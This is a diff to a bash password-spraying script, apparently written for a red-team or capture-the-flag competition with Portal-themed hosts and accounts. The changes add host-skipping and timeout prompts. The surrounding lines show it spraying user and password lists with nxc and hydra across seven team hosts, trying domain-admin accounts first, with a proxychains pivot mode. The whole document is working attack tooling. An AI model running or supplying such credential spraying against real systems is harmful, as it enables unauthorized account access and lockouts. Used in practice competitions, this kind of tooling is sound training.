@@ -10,34 +10,69 @@
 # Default: stop spraying a host after first hit, continue to other hosts
 # -a flag : continue spraying everything (all users × all hosts × all protocols)
 # -x flag : use internal 172.16.x.x IPs (for proxychains pivot)
+# -s flag : skip specific hosts by name or number
 # DA accounts are tried first before users.txt entries
+#
+# If spraying a host takes >30s, you'll be prompted to skip it.
 # ================================================
 
 set -euo pipefail
 
 usage() {
-  echo "Usage: $0 <team_number> [-a] [-x] [-u user1] [-u user2] ..."
-  echo "  -a        continue-on-success: keep spraying after first hit"
-  echo "  -x        use internal 172.16.x.x IPs (proxychains/pivot mode)"
-  echo "  -u USER   add USER to the front of the spray list (repeatable)"
+  echo "Usage: $0 <team_number> [-a] [-x] [-u user1] [-s host1] ..."
+  echo "  -a          continue-on-success: keep spraying after first hit"
+  echo "  -x          use internal 172.16.x.x IPs (proxychains/pivot mode)"
+  echo "  -u USER     add USER to the front of the spray list (repeatable)"
+  echo "  -s HOST     skip this host (name or 1-7, repeatable)"
+  echo ""
+  echo "  Hosts: 1=curiosity 2=morality 3=intelligence 4=anger 5=fact 6=space 7=adventure"
+  echo "  If spraying a host takes >30s, you'll be prompted to skip it."
   exit 1
 }
 
 CONTINUE_ALL=0
 USE_INTERNAL=0
 EXTRA_USERS=()
+SKIP_HOSTS=()   # hosts to skip entirely
+HOST_TIMEOUT=30 # seconds before offering to skip a host
+
+# Host name/number mapping for -s flag
+declare -A _NUM_TO_HOST=(
+  [1]="curiosity" [2]="morality" [3]="intelligence"
+  [4]="anger" [5]="fact" [6]="space" [7]="adventure"
+)
+declare -A _HOST_OCTET=(
+  ["curiosity"]=140  ["morality"]=10  ["intelligence"]=11
+  ["anger"]=70       ["fact"]=71      ["space"]=141
+  ["adventure"]=72
+)
 
 if [[ $# -lt 1 ]]; then usage; fi
 TEAM="$1"; shift
 
-while getopts "axu:" opt; do
+while getopts "axu:s:" opt; do
   case "$opt" in
     a) CONTINUE_ALL=1 ;;
     x) USE_INTERNAL=1 ;;
     u) EXTRA_USERS+=("$OPTARG") ;;
+    s)
+      # Accept host name or number
+      if [[ "$OPTARG" =~ ^[1-7]$ ]]; then
+        SKIP_HOSTS+=("${_NUM_TO_HOST[$OPTARG]}")
+      elif [[ -n "${_HOST_OCTET[$OPTARG]:-}" ]]; then
+        SKIP_HOSTS+=("$OPTARG")
+      else
+        echo "[-] Unknown host for -s: '$OPTARG'"
+        echo "    Valid: curiosity morality intelligence anger fact space adventure (or 1-7)"
+        exit 1
+      fi
+      ;;
     *) usage ;;
   esac
 done
+
+# Ordered host list (same order as IPS array)
+HOST_NAMES=(curiosity morality intelligence anger fact space adventure)
 
 if [[ $USE_INTERNAL -eq 1 ]]; then
   IPS=(
@@ -63,6 +98,29 @@ else
   )
 fi
 
+# Build IP-to-hostname map and apply -s skips
+declare -A IP_TO_HOST
+declare -A SKIP_IPS
+for i in "${!IPS[@]}"; do
+  IP_TO_HOST["${IPS[$i]}"]="${HOST_NAMES[$i]}"
+done
+
+for skip in "${SKIP_HOSTS[@]}"; do
+  for i in "${!HOST_NAMES[@]}"; do
+    if [[ "${HOST_NAMES[$i]}" == "$skip" ]]; then
+      SKIP_IPS["${IPS[$i]}"]=1
+      echo "[*] Skipping ${skip} (${IPS[$i]})"
+    fi
+  done
+done
+
+# Filter out skipped hosts from IPS
+FILTERED_IPS=()
+for ip in "${IPS[@]}"; do
+  [[ -z "${SKIP_IPS[$ip]:-}" ]] && FILTERED_IPS+=("$ip")
+done
+IPS=("${FILTERED_IPS[@]}")
+
 USERS_FILE="users.txt"
 PASSES="passwords.txt"
 DOMAIN="aperturesciencelabs.org"
@@ -71,6 +129,12 @@ GOT_ACCESS=0
 
 # Per-IP hit tracking: once we get a hit on an IP, skip it for remaining attempts
 declare -A HIT_IPS
+
+# Per-IP spray start time: for 30s timeout prompt
+declare -A HOST_START_TIME
+
+# Track dynamically skipped hosts
+declare -A DYNAMIC_SKIP_IPS
 
 # ============== BUILD USER LIST (explicit → DA → users.txt) ==============
 DA_USERS=(Administrator caroline cave chell glados wheatley)
@@ -163,6 +227,8 @@ done
 
 echo "[*] Users: ${#ALL_USERS[@]} (${#EXTRA_USERS[@]} explicit + ${#DA_USERS[@]} DA + $((${#ALL_USERS[@]}-${#DA_USERS[@]}-${#EXTRA_USERS[@]})) from users.txt)"
 [[ $CONTINUE_ALL -eq 1 ]] && echo "[*] Mode: full spray (all users × all hosts)" || echo "[*] Mode: stop-per-host (skip host after first hit)"
+[[ ${#SKIP_HOSTS[@]} -gt 0 ]] && echo "[*] Skipped hosts: ${SKIP_HOSTS[*]}"
+echo "[*] Host timeout: ${HOST_TIMEOUT}s (will prompt to skip slow hosts)"
 echo "[*] Starting spray for TEAM ${TEAM} at $(date)"
 echo ""
 
@@ -176,10 +242,47 @@ record_hit() {
   fi
 }
 
-# Check if an IP has already been hit (skip it unless -a)
+# Check if an IP has already been hit (skip it unless -a) or dynamically skipped
 ip_done() {
   local ip="$1"
+  [[ -n "${DYNAMIC_SKIP_IPS[$ip]:-}" ]] && return 0
   [[ $CONTINUE_ALL -eq 0 && -n "${HIT_IPS[$ip]:-}" ]]
+}
+
+# Check if we've been spraying this host for >30s and prompt to skip
+check_host_timeout() {
+  local ip="$1"
+  local host_name="${IP_TO_HOST[$ip]:-$ip}"
+  local start="${HOST_START_TIME[$ip]:-}"
+  [[ -z "$start" ]] && return 0
+
+  local now elapsed
+  now=$(date +%s)
+  elapsed=$((now - start))
+
+  if [[ $elapsed -ge $HOST_TIMEOUT && -z "${DYNAMIC_SKIP_IPS[$ip]:-}" ]]; then
+    echo ""
+    echo "  [!] Spraying ${host_name} (${ip}) has taken ${elapsed}s (>${HOST_TIMEOUT}s)"
+    read -t 10 -rp "  [?] Skip this host? [Y/n] (auto-continues in 10s): " answer </dev/tty || answer=""
+    if [[ -z "$answer" || "${answer,,}" == "y" || "${answer,,}" == "yes" ]]; then
+      echo "  [*] Skipping ${host_name} for the rest of this spray"
+      DYNAMIC_SKIP_IPS["$ip"]=1
+      return 1
+    else
+      echo "  [*] Continuing ${host_name}..."
+      # Set start time far in future so we don't re-prompt
+      HOST_START_TIME["$ip"]=$((now + 999999))
+    fi
+  fi
+  return 0
+}
+
+# Mark the start of spraying a new host
+mark_host_start() {
+  local ip="$1"
+  if [[ -z "${HOST_START_TIME[$ip]:-}" ]]; then
+    HOST_START_TIME["$ip"]=$(date +%s)
+  fi
 }
 
 # ============== SINGLE-ATTEMPT HELPERS ==============
@@ -225,8 +328,10 @@ while IFS= read -r pass || [[ -n "$pass" ]]; do
 
     for ip in $targets; do
       ip_done "$ip" && continue
+      mark_host_start "$ip"
       for user in "${ALL_USERS[@]}"; do
         ip_done "$ip" && break
+        check_host_timeout "$ip" || break
         try_nxc "$proto" "$ip" "$user" "$pass" || true
       done
     done
@@ -240,8 +345,10 @@ while IFS= read -r pass || [[ -n "$pass" ]]; do
 
       for ip in $targets; do
         ip_done "$ip" && continue
+        mark_host_start "$ip"
         for user in "${ALL_USERS[@]}"; do
           ip_done "$ip" && break
+          check_host_timeout "$ip" || break
           try_hydra "$proto" "$ip" "$user" "$pass" || true
         done
       done
